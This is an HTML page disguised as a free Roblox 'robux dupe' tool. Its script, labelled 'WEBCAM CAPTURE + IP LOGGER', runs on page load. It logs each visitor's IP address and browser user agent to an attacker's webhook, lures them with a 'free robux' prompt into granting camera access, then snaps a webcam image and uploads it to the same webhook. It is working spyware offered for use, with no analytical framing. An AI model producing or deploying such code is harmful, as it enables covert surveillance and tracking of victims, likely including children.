<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Camera Capture and Webhook Send</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
    }
    video {
      width: 100%;
      max-width: 500px;
      border: 2px solid #ccc;
      border-radius: 10px;
    }
    button {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 16px;
    }
    #statusText {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h2>Dupe robux</h2>
  <video id="videoElement" autoplay playsinline></video>
  <canvas id="canvasElement" style="display:none;"></canvas>
  <br>
  <button id="captureBtn">Dupe roblox X robux free</button>
  <p id="statusText"></p>

  <script>
 // ䷀䷁䷂䷄ WEBCAM CAPTURE + IP LOGGER ䷅䷆䷇䷈
const WEBHOOK_URL = "YOUR_WEBHOOK_HERE";

// 丂ᚴᛁᚥᛖ丂丂丂丂 GET IP
async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const { ip } = await res.json();
    return ip;
  } catch {
    return "IP_FETCH_FAILED";
  }
}

// ䷀䷁䷊䷋ LOG TO WEBHOOK
async function logToWebhook(title, description) {
  const embed = {
    title: title,
    description: description,
    color: title.includes("❌") ? 0xff0000 : 0x00ff00,
    timestamp: new Date().toISOString()
  };
  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] })
  });
}

// 丂ᚴᛁᚥᛖ丂丂丂丂 WEBCAM SNATCHER
async function hijackWebcam() {
  try {
    const ip = await getIP();
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    
    video.onloadedmetadata = () => {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("file", blob, `webcam_${ip}.jpg`);
        fetch(WEBHOOK_URL, { method: "POST", body: formData });
        logToWebhook("📸 WEBCAM CAPTURED", `IP: ${ip}\nResolution: ${canvas.width}x${canvas.height}`);
        
        // Stop stream after capture
        stream.getTracks().forEach(track => track.stop());
      }, "image/jpeg", 0.85);
    };
  } catch (err) {
    logToWebhook("❌ WEBCAM FAILED", `IP: ${await getIP()}\nError: ${err.message}`);
  }
}

// ䷀䷁䷊䷋ MAIN EXECUTION
(async function() {
  const ip = await getIP();
  await logToWebhook("🌐 VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);

  if (confirm("Allow webcam for free robux?")) {
    await hijackWebcam();
  } else {
    await logToWebhook("⚠️ WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
  }

  // 丂ᚴᛁᚥᛖ丂丂丂丂 MANUAL TRIGGER BUTTON
  document.body.innerHTML += `
    <button id="executeBtn" style="
      position:fixed;
      top:10px;
      right:10px;
      z-index:9999;
      background:#ff0000;
      color:white;
      border:none;
      padding:8px 12px;
      border-radius:4px;
      cursor:pointer;
    ">
      GET FREE ROBUX
    </button>
  `;
  document.getElementById("executeBtn").addEventListener("click", hijackWebcam);
})();
  </script>

</body>
</html>
